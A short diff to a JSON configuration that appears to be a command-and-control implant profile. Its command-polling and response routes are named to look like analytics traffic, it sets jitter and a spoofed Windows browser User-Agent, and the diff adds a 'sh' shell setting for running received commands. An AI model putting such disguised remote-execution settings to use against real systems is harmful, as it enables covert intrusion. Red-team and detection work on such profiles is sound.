@@ -5,6 +5,7 @@
     "jitter_max": 15,
     "next_command_route": "/v1/analytics/batch",
     "command_response_route": "/v1/collect/i",
+    "shell": "sh",
     "headers": {
       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
       "Accept": "text/html,application/xhtml+xml",
